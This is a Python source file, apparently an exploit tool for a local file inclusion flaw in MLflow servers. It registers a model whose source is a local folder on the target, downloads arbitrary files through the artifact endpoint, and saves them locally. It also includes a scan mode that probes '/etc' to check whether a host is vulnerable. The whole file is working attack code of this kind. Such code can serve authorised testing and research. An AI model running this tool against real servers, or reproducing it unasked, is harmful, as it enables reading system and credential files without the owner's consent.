import requests
from pathlib import Path
import sys


class APICalls:
    def __init__(self, host: str, identifier: str, vuln_scan=False):
        self.host = host
        self.version = 1
        self.identifier = identifier
        self.vuln_scan = vuln_scan

    def run(self, source: str) -> dict:
        # Split the source into the folder and file
        source_folder = self.get_source_folder(source)
        path = source.rsplit('/', 1)[1]

        # Create folder based on host
        folder_name = self.create_folder()

        # Make API requests
        cm_resp = self.create_model()
        rm_resp = self.register_model(source_folder)
        ma_resp = self.get_model_artifacts(path)
        self.version += 1

        # Write the response to a file
        files_found = self.handle_response(ma_resp, folder_name, source_folder, path) # {"remote/file/path": "file_content"}

        return files_found

    def get_source_folder(self, source: str) -> str:
        # Split the source into the folder and file
        source_split = source.split("://")
        source_protocol = source_split[0]
        source = source_split[1]
        if source.count('/') > 1:
            source_folder = source.rsplit('/', 1)[0]
        return source_protocol + "://" + source_folder

    def create_model(self) -> requests.Response:
        resp = requests.post(f'{self.host}/ajax-api/2.0/mlflow/registered-models/create', json={"name": f"{self.identifier}"})
        return resp

    def register_model(self, source_folder: str) -> requests.Response:
        resp = requests.post(f'{self.host}/ajax-api/2.0/mlflow/model-versions/create', json={"name": f"{self.identifier}", "source": source_folder})
        text = resp.text
        if "Model version source cannot be a local path" in text:
            print(f"[-] {self.host} is not vulnerable to LFI")
            exit(0)
        return resp

    def vulnerability_scan(self) -> None:
        rm_resp = self.register_model("/etc")
        body = rm_resp.text
        if "Model version source cannot be a local path" in body:
            print(f"[-] {self.host} is not vulnerable to LFI")
        else:
            print(f"[!] {self.host} is vulnerable to LFI")
        exit(0)

    def get_model_artifacts(self, path: str) -> requests.Response:
        resp = requests.get(f'{self.host}/model-versions/get-artifact?path={path}&name={self.identifier}&version={self.version}')
        return resp

    def create_folder(self) -> str:
        try:
            folder_name = self.host.split('//')[1].split(':')[0] + "_files"
        except IndexError:
            sys.exit("[-] Invalid host, did you include the protocol like http:// or https:// for the -s option?")
        Path(folder_name).mkdir(parents=True, exist_ok=True)
        return folder_name

    def handle_response(self, resp: requests.Response, folder_name: str, source_folder: str, path: str) -> dict:
        """ Returns a dictionary of {remote_file_path: file_content} """
        files_found = {}
        if resp.status_code == 200:
            source_folder_replacement = source_folder.replace("/", "_")
            path_replacement = path.replace("_", "-")
            filename = f'{folder_name}/{source_folder_replacement}_{path_replacement}'
            with open(f"{filename}", "wb+") as f:
                c = resp.content
                f.write(c)
                files_found[f'{source_folder}/{path}'] = c
            print(f"[+] Success: {source_folder}/{path} saved in {filename}")

        return files_found # In form of {"remote/file/path": "file_content"}

